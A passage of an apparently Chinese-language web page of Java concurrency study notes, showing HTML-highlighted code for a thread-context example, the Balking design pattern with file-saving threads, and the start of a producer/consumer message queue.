        <span class="token class-name">Context</span> context <span class="token operator">=</span> <span class="token class-name">ActionContext</span><span class="token punctuation">.</span><span class="token function">getActionContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> name <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> cardId <span class="token operator">=</span> <span class="token function">getCardId</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        context<span class="token punctuation">.</span><span class="token function">setCardId</span><span class="token punctuation">(</span>cardId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token function">getCardId</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token string">"435467523543"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 测试类
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ContextTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span>
                        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ExecutionTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter12：Balking设计模式</h1>
<p>某个线程发现其他线程正在执行相同的任务而放弃即将开始的任务（修改之前的判断）</p>
<blockquote>
<p>Java高并发编程详解：第二十二章</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileWriter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Writer</span></span><span class="token punctuation">;</span>


<span class="token comment">/**
 * balking 设计模式核心：save 方法
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BalkingData</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> fileName<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> content<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> changed<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">BalkingData</span><span class="token punctuation">(</span><span class="token class-name">String</span> fileName<span class="token punctuation">,</span> <span class="token class-name">String</span> content<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>fileName <span class="token operator">=</span> fileName<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>content <span class="token operator">=</span> content<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>changed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token class-name">String</span> newContent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>content <span class="token operator">=</span> newContent<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>changed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/**
     * 多个线程同时执行保存任务，其中一个线程完成后changed被调整，另外一个线程不会继续执行
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>changed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">doSave</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>changed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">doSave</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" calls do save. content = "</span> <span class="token operator">+</span> content<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Writer</span> writer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileWriter</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>
            writer<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"line.separator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            writer<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程A: 程序触发保存任务
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CustomerThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">BalkingData</span> balkingData<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">CustomerThread</span><span class="token punctuation">(</span><span class="token class-name">BalkingData</span> balkingData<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"Customer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>balkingData <span class="token operator">=</span> balkingData<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token comment">// 保存数据</span>
            balkingData<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 变更数据</span>
                balkingData<span class="token punctuation">.</span><span class="token function">change</span><span class="token punctuation">(</span><span class="token string">"No."</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1_000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 保存数据</span>
                balkingData<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 线程B：后台自动保存
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WaiterThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">BalkingData</span> balkingData<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">WaiterThread</span><span class="token punctuation">(</span><span class="token class-name">BalkingData</span> balkingData<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"Waiter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>balkingData <span class="token operator">=</span> balkingData<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token comment">// 后台自动保存</span>
                balkingData<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 测试类
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BalkingTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> fileName <span class="token operator">=</span> <span class="token string">"D:\\RECEIVED\\test.txt"</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> content <span class="token operator">=</span> <span class="token string">"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; BEGIN &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;"</span><span class="token punctuation">;</span>
        <span class="token class-name">BalkingData</span> balkingData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BalkingData</span><span class="token punctuation">(</span>fileName<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">WaiterThread</span><span class="token punctuation">(</span>balkingData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">CustomerThread</span><span class="token punctuation">(</span>balkingData<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>Chapter13：生产者/消费者模式</h1>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">`<span class="token comment">/**
 * 消费主体
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Message</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> data<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Message</span><span class="token punctuation">(</span><span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>data <span class="token operator">=</span> data<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> data<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 消费队列
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MessageQueue</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_MAX_LIMIT</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Message</span><span class="token punctuation">&gt;</span></span> queue<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> limit<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">MessageQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token constant">DEFAULT_MAX_LIMIT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">MessageQueue</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token keyword">int</span> limit<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>limit <span class="token operator">=</span> limit<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">Message</span> message<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> limit<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                queue<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            queue<span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
            queue<span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Message</span> <span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>queue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                queue<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token class-name">Message</span> message <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">removeFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            queue<span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> message<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicInteger</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * 生产者
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">MessageQueue</span> messageQueue<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">AtomicInteger</span> counter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token keyword">public</span> <span class="token class-name">ProducerThread</span><span class="token punctuation">(</span><span class="token class-name">MessageQueue</span> messageQueue<span class="token punctuation">,</span> <span class="token keyword">int</span> seq<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"PRODUCER-"</span> <span class="token operator">+</span> seq<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>messageQueue <span class="token operator">=</span> messageQueue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Message</span> message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Message</span><span class="token punctuation">(</span><span class="token string">"Message-"</span> <span class="token operator">+</span> counter<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                messageQueue<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" put message "</span> <span class="token operator">+</span> message<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 消费者
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConsumerThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">MessageQueue</span> messageQueue<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">ConsumerThread</span><span class="token punctuation">(</span><span class="token class-name">MessageQueue</span> messageQueue<span class="token punctuation">,</span> <span class="token keyword">int</span> seq<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"CONSUMER-"</span> <span class="token operator">+</span> seq<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>messageQueue <span class="token operator">=</span> messageQueue<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
